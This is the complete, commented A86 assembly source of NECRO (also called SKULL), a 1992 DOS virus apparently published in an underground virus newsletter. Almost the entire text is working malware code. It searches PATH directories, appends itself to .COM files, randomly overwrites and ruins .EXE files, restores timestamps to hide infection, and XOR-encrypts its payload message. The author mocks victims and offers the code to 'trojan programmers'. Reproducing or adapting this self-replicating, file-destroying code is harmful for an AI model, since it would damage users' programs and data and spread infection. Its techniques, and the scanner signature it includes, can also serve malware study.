; A86 SOURCE CODE for:
;
;          ++===================================================++
;          ||           NECRO (A.K.A. 'SKULL' virus)            ||
;          ||           The 666 byte Dual Replicator            ||
;          ||     DEC 1992 by Primal Fury, Lehigh Valley, PA    ||
;          ++===================================================++
;                   -=Prepared for Crypt Newsletter 11=-
;
; Here's a virus that's actually two viruses in one.  The main virus is a
; a direct action, appending .COM infector.  It will search the system path
; for .COMs to infect, and may infect files on the path in preference to 
; to those in the current directory (if no path is set, it stays in the
; current directory).  Roughly one out of every eight infections (on a ran-
; dom basis) will be non-standard.  In these infections, NECRO will toggle to 
; an overwriting .EXE infector.  
;   
;  
; This .EXE infector is composed of much of the same code as the 
; COM infector -- the virus alternates between the two modes of infection 
; using a 'master switch' which is hooked up to a simple randomization 
; engine.  The master switch, when thrown, trips a series of auxilliary
; switches which alter the virus' behavior.  This saves on bytes and is 
; therefore much better than having the virus drop an entirely independent
; .EXE overwriter.  I hope to expand upon this 'self-programming' concept
; in future viruses.
  
; Infected .COM's should function as intended after the viral code appended to 
; them has finished doing its thing. But infected .EXE's are ruined.  These 
; (provided they are under about 64K in length) will, when executed, pass 
; their illness on to the next uninfected .EXE within the current directory, 
; displaying the following graphic & message:

;   ‹‹€€€€€€€€‹‹           
; ‹€€€€€≤€€€€€€€€        
;ﬁ€≤€€€€€€€€€€€€€›   You cant execute this file:         
;ﬁ€€€€€≤≤€€€ﬂ   €    Its already dead!           
; €€€€€€≤≤€€‹‹‹€ﬂ          
;  €€€€≤≤ﬂ≤€€€€›           
;   ﬂﬂ€€≤≤‹ﬁ≤€€€›          
;           ≤≤›››              
 
; SKULL will then return the baffled user to the DOS prompt. I leave it to  
; your imagination to picture the consternation on the novice's face 
; as he tries to isolate the source of this overwriting infection which 
; seems to pop up again and again in different directories.  A very 
; observant user may notice a file length increase of exactly 666 bytes in 
; infected .COM's.  Infected .EXE's will not increase in length unless they  
; are less than ~200 bytes to begin with.  Note that overwritten .EXE's larger  
; than 64K will fail to load and will be non-infectious. Like Popoolar 
; Science, the virus renders these programs into a .COM-like in structure. 
; DOS will NOT execute these files.  In any case, the programs are ruined  
; by SKULL.  As of this release, NECRO avoids files that are read-only or 
; hidden, so these files are be safe from the virus (for now...)
  
; CREDITS:  DARK ANGEL   --  for his COM infector replicatory code. (D.A.)  
;           NOWHERE MAN  --  for his VCL 1.0's path-searching routine. (N.M.)
;           
;  
; Except where noted, I have commented the code with the novice 
; programmer in mind.  In the places so noted, D.A.'s and N.M.'s com-
; ments, supplied from VCL 1.0 and PS-MPC assembly libraries, have been 
; left intact.

; To assemble, use Isaacson's A86 to generate a .COMfile directly from
; this listing.  You will have a live NECRO launcher. MASM/TASM
; compatible assemblers will require the addition of a declarative pair.
;
; Partial viral signature suitable for loading into TBScan's VIRSCAN.DAT,
; SCAN, or F-PROT 2.0x:
; [Necro]
; A9 01 00 74 29 E8 6A 00 8C C8 8E D8 8E C0 32 C0  

  
  Start:  db      0e9h     ; jump to find_start
          dw      0
  Find_start:  call    next              ;common technique to allow virus to
  next:   pop     bp                     ;find its own code.  On exit, bp
          sub     bp, offset next        ;points to start of code.
          lea     si, [bp+offset stuff]  ;Prepare to restore orig. 3 bytes.
          mov     di, 100h               ;push 100h, where all COMs start in
          push    di                     ;memory, & where control will be
                                         ;returned to host file.
          movsw                          ;restore the 3 bytes formerly relo-
          movsb                          ;cated by the virus upon infection.
          mov     di,bp                  ;point DI to start of virus.
          lea     dx, [bp+offset dta]    ;set new Disk Transfer Address, so
          call    set_dta                ;virus won't fuck up original.
          call    search_files           ;call path-search/infection routine.
          jmp     quit                   ;when done, return control to 
                                         ;host file.
          
  ;Nowhere Man's VCL 1.0 path search routine, slightly modified for 
  ;compatibility with Dark Angel's code, and with 'master infection-mode 
  ;switch' added.  N.M.'s original comments have been retained for your 
  ;enlightenment.    

search_files:
          mov     bx,di                   ; BX points to the virus
          push    bp                      ; Save BP
          mov     byte ptr [bp+offset pathstore],'\'  ;Start with a backslash
          mov     ah,047h                 ; DOS get current dir function
          xor     dl,dl                   ; DL holds drive # (current)
          lea     si,[bp+offset pathstore+1] ; SI points to 64-byte buffer
          int     021h
          call    traverse_path           ; Start the traversal

traversal_loop: 
          cmp     word ptr [bx + path_ad],0     ; Was the search unsuccessful?
          je      done_searching          ; If so then we're done
          call    found_subdir            ; Otherwise copy the subdirectory
          mov     ax,cs                   ; AX holds the code segment
          mov     ds,ax                   ; Set the data and extra
          mov     es,ax                   ; segments to the code segment
          xor     al,al                   ; Zero AL
          stosb                           ; NULL-terminate the directory
          mov     ah,03Bh                 ; DOS change directory function
          lea     dx,[bp+offset pathstore+65] ; DX points to the directory
          int     021h
                                                                    
          ;The Master Switch, tied whimsically to the system clock:

          mov     ah,2ch                  ;DOS get system time.                      
          int     21h                     ;        
          cmp     dl,13                   ;is 1/100th second > 13?
          jg      call_infector           ;if so, stay in COM infector
                                          ;mode (the default).
          mov     si,3                    ;throw switch for EXE infect.

          ;back to Nowhere Man's code:

call_infector:  
          push    di
          call    find_files              ; Try to infect a file.
          pop     di
          jnc     done_searching          ; If successful, exit
          jmp     short traversal_loop    ; Keep checking the PATH

done_searching: 
          mov     ah,03Bh                 ; DOS change directory function
          lea     dx,[bp+offset pathstore]   ; DX points to old directory
          int     021h
          cmp     word ptr [bx + path_ad],0  ; Did we run out of directories?
          jne     at_least_tried          ; If not, exit
          stc                             ; Set carry flag for failure

at_least_tried: 
          pop     bp                      ; Restore BP
          ret                             ; Return to caller

com_mask        db      "*.COM",0               ; Mask for all .COM files


traverse_path:   
          mov     es,word ptr cs:[002Ch]  ; ES holds the enviroment segment
          xor     di,di                   ; DI holds the starting offset

find_path:      
          lea     si,[bx + ath_string]    ; SI points to "PATH="
          lodsb                           ; Load the "P" into AL
          mov     cx,08000h               ; Check the first 32767 bytes
          repne   scasb                   ; Search until the byte is found
          mov     cx,4                    ; Check the next four bytes

check_next_4:   
          lodsb                           ; Load the next letter of "PATH="
          scasb                           ; Compare it to the environment
          jne     find_path               ; If there not equal try again
          loop    check_next_4            ; Otherwise keep checking

          mov     word ptr [bx + path_ad],di      ; Save the PATH address
          mov     word ptr [bx + path_ad + 2],es  ; Save the PATH's segment
          ret                             ; Return to caller

ath_string      db      "PATH="           ; The PATH string to search for
path_ad         dd      ?                 ; Holds the PATH's address

found_subdir:    
          lds     si,dword ptr [bx + path_ad]     ; DS:SI points to PATH
          lea     di,[bp+offset pathstore+65] ; DI points to the work buffer
          push    cs                      ; Transfer CS into ES for
          pop     es                      ; byte transfer

move_subdir:    
          lodsb                           ; Load the next byte into AL
          cmp     al,';'                  ; Have we reached a separator?
          je      moved_one               ; If so we're done copying
          or      al,al                   ; Are we finished with the PATH?
          je      moved_last_one          ; If so get out of here
          stosb                           ; Store the byte at ES:DI
          jmp     short move_subdir       ; Keep transfering characters

moved_last_one: 
          xor     si,si                   ; Zero SI to signal completion

moved_one:      
          mov     word ptr es:[bx + path_ad],si ; Store SI in the path address
          ret                             ; Return to caller



  ;O.K. -- Now here's an important 'architectural' point:  The following 
  ;code (down to the next inset) will never be executed within the COM 
  ;appender (that viral code jumps over it).  It will, however be the first 
  ;thing executed within overwritten EXE files.  Why?  Because in EXE infec-
  ;tion mode, everything from EXFECT on down (but nothing previous) is 
  ;written over the beginning of the EXE host file.

  exfect:       call    next_two            ;Here again we see the old trick
                                            ;for pointing BP to start of  
  next_two:     pop     bp                  ;viral code.  (possibly should
                sub     bp, offset next_two ;have been subroutined [?]).
                mov     si,3                ;throw master switch for EXE    
                                            ;infection, so infection code
                                            ;below knows to use that mode!
                lea     dx,[bp+offset dta]  ;set DTA:  This would normally     
                call    set_dta             ;be utterly ridiculous (!) in an
                                            ;overwriting virus but is used
                                            ;here to maintain compatibility
                                            ;with the infection code.      
                call    find_files          ;try to infect another EXE.
                jmp     prequit             ;display message & quit to DOS.

  ;Now we're back to Dark Angel's code, expanded to save & restore file 
  ;date/time-stamp, and of course to accomodate the new EXE overwriting code 
  ;and infection-mode 'switching system'.  This is where infection actually 
  ;takes place.

  find_files:   
          
          push    bp                ;for compatibility with path-search.         
          mov     ah, 4eh           ;phunction phor phinding phirst phile 
                                    ;that phits phile-mask.
  tryanother:
          lea     dx, [bx+com_mask] ;by default, look for a .COM extension. 
          cmp     si, 3             ;is the EXE infector switch thrown?
          jne     short look        ;if not go on, else qeue up '*.EXE' mask
          lea     dx, [bp+exemask]  ;in place of '*.COM'.  

  look:    
          xor     cx, cx            ;attribute mask - find only normal
          int     21h               ;attributes.
          jnc     open_file         ;Have we run out of candidates in this
          pop     bp                ;directory?  If not go on, else return.
          ret                       ;note: a candidate file matches the file
                                    ;mask & has normal attributes.
  open_file:
          mov     ax, 3D02h              ;DOS open file function.
          lea     dx, [bp+offset dta+30] ;get file name out of DTA (put there
                                         ;for us by the 4eh or 4fh function).
          int     21h
          xchg    ax, bx
          mov     ah, 3fh             ;read the first 3 bytes of file & put
          lea     dx, [bp+stuff]      ;them in 'stuff' buffer, where we can
          mov     cx, 3               ;inspect them for previous infection.
          int     21h
          cmp     si,3                ;is the EXE infector switch thrown?
          jne     short comcheck      ;if not, use the COM file checker.
          mov     di,dx               ;otherwise, check EXE for infection.
          cmp     byte ptr [di], 4dh  ;is the first byte of the EXE an 'M'?
          jne     short searchloop    ;no? then already fucked. Keep looking.
          jmp     infect_file         ;otherwise let's infect it.

  comcheck:                                      ;DARK ANGEL'S COMMENTS: 
          mov     ax, word ptr [bp+dta+26]       ;"ax = filesize
          mov     cx, word ptr [bp+stuff+1]      ;jmp location
          add     cx, eov - find_start + 3       ;convert to filesize
          cmp     ax, cx                         ;if same, already infected
          jnz     short infect_file              ;so quit out of here"
          
  searchloop:                          
          call    close               ;close the file.
          mov     ah, 4fh             ;DOS 'find next file' function.
          jmp     short tryanother    ;go back up & try to find new victim.

  infect_file:
          mov     cx, word ptr [bp+dta+22]       ;Read file date & time
          mov     dx, word ptr [bp+dta+24]       ;stamps from DTA & store
          push    cx                             ;them for retrieval after
          push    dx                             ;infection is complete.
          cmp     si, 3                          ;branch if this is to be
          jne     short comfect                  ;a COM infection.  other-
                                                 ;wise, we now replicate the
                                                 ;EXE overwriting virus.
          xor     al, al                         ;go to the beginning of
          call    f_ptr                          ;the file.
          mov     ah, 40h                        ;write to file function.
          mov     cx, eov - exfect               ;write EXFECT through EOV   
          lea     dx, [bp+exfect]                ;to the EXE file.  [another 
          int     21h                            ;EXE is now our slave.]
          jmp     short finishfect               ;now, finish up.
                                               
  comfect:                                       ;COM infection routine.             
                                                 ;SAYETH DARK ANGEL:
                                          ;"Calculate the offset of the jmp.
          sub     ax, 3                          ;ax = filesize - 3"
          mov     word ptr [bp+writebuffer], ax  ;store jump offset in buffer.
          xor     al, al                         ;null AL (write will start
          call    f_ptr                          ;at byte 0 of file.  move
                                                 ;file pointer there).    
          mov     ah, 40h                        ;write to file function.
          mov     cx, 3                          ;we'll write 3 bytes, namely
          lea     dx, [bp+e9]                    ;the contents of E9 buffer.
          int     21h                            ;victim file now begins with
                                                 ;a jump to the viral code!
          mov     al, 2                          ;now move file pointer to
          call    f_ptr                          ;the end of the victim file.
          mov     ah, 40h                        ;write to file again.
          mov     cx, eov - find_start           ;Namely, write the main
          lea     dx, [bp+find_start]            ;viral code.
          int     21h                            ;virus is now appended to
                                                 ;the file.
  finishfect:                                    ;now to clean up a little.
          pop     dx                             ;get old file date/time-
          pop     cx                             ;stamp off of stack.
          mov     ax, 5701h                      ;DOS set file date/time
          int     21h                            ;stamp. (Otherwise, they
                                                 ;would be left set to date
                                                 ;& time of infection).
          pop     bp                             ;path-searcher will want 
                                                 ;it's old bit pointer back.
  close:
          mov     ah, 3eh                        ;DOS close file function.
          int     21h
          ret                                    ;return to CALL_INFECTOR.

                                               ;end of infection routine.
          
  primal          db     "ΩŒ≈√“œΩ°†‚˘†–ÚÈÌ·Ï†∆ıÚ˘"     ;an encrypted text            
          ;string, mainly here to pad appended virus length out to 666 
          ;bytes.  'Tight Code' purists will shit a brick over this.                 

  ;the COM infector never uses the PREQUIT routine below.  Only the EXFECT 
  ;routine (which is only used by the EXE overwriting virus, for reasons ex-
  ;plained in the inset above EXFECT) jumps to it.  It's the EXE infector's 
  ;message payload.  PREQUIT uses a simple encryption/decryption mechanism 
  ;to keep the message hidden from file viewers & such.  It may have been 
  ;better (albeit a bit costlier in speed & bytes) to encrypt the entire 
  ;virus (preferably, with polymorphic capabilities tossed in).  I hope to 
  ;make this mod in my next variant.  But for now, trojan programmers might 
  ;find this routine of interest:

  prequit:                          
           lea    si,[bp+offset msg]  ;queue up message to be displayed.
           mov    cx,204              ;CX holds length of message.
  
  xorloop:                            ;loop will decrypt & display message.
           lodsb                      ;load next byte of message into AL.
           xor    al,128              ;XOR the byte by our key.
           mov    ah,0eh              ;BIOS 'teletype' write to screen (the
           int    10h                 ;the character is already in AL).
           loop   xorloop             ;loop until CX's # of bytes processed.
           mov    ax,4c00h            ;exit to DOS function, will return   
           int    21h                 ;user to DOS prompt.

; Here's the encrypted version of our 'can't execute' message.  Note that
; this odd byte pattern may look suspicious to someone in the know using a
; file viewer, but then, so would the unencrypted file_masks and "PATH="!

  msg      db      "çä††††\\[[[[[[[[\\çä††\[[[[[2[[[[[[[[çä†^[2[[[[[[[["
           db      "[[[[[]†††ŸÔı†„·ÓÙ†Â¯Â„ıÙÂ†ÙËÈÛ†ÊÈÏÂ∫çä†^[[[[[22[[[_"
           db      "†††[††††…ÙÛ†·ÏÚÂ·‰˘†‰Â·‰°çä††[[[[[[22[[\\\[_çä†††[["
           db      "[[22_2[[[[]çä††††__[[22\^2[[[]çä††††††††††††22]]]çä"

; D.A. SAYS: "Restore the DTA and return control to the original program
  quit:   mov     dx, 80h             ;Restore current DTA to
                                      ;the default @ PSP:80h
  set_dta:
          mov     ah, 1ah             ;Set disk transfer address"
          int     21h                 ;so, let it be written,              
          ret                        ;so, let it be done.

  f_ptr:  mov     ah, 42h             ;DOS move file pointer
          xor     cx, cx              ;DARK ANGEL:       
          cwd                         ;"equivalent to: xor dx, dx"
          int     21h
          ret
                           
  exemask  db      "*.EXE",0          ;file-mask for EXEs.
  
  ; All commentary from here down is the DARKANGELMEISTER's.  Hope you found
  ; the code useful and/or informative.  P.F. signing off...       
                       
  ; Original three bytes of the infected file
  ; Currently holds a INT 20h instruction and a null byte 
  stuff   db      0cdh, 20h, 0
  e9      db      0e9h
  eov equ $                                      ; End of the virus
  ; The following variables are stored in the heap space (the area between
  ; the stack and the code) and are not part of the virus that is written
  ; to files.
  writebuffer dw  ?                              ; Scratch area holding the
                                                 ; JMP offset
  dta         db 42 dup (?)
  pathstore   db 135 dup (?)
